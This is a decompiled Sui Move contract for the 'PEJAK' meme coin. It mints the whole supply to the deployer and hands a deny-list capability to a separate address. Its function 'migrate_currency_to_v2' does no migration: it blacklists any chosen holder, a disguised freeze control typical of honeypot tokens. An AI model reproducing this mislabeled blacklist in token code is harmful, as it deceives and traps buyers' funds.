module 0x4a1bed27f82b9f2e276a1449b3b4b61c2f6ab3c3404d15458112b5ce48336a79::pejak {
    struct PEJAK has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<PEJAK>, arg1: 0x2::coin::Coin<PEJAK>) {
        0x2::coin::burn<PEJAK>(arg0, arg1);
    }

    fun init(arg0: PEJAK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PEJAK>(arg0, 9, b"PEJAK", b"Pejak", b"Pejak is a hot boy on meme Sui ooohhh", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/wJSDsSK/ava-up-dex.jpg")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PEJAK>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEJAK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PEJAK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEJAK>>(v1, @0xdcd1d2178d17f070aed53cfa4311bca8f5eda7a841faab7e4bdd247753f76ec6);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEJAK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PEJAK>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<PEJAK>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<PEJAK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

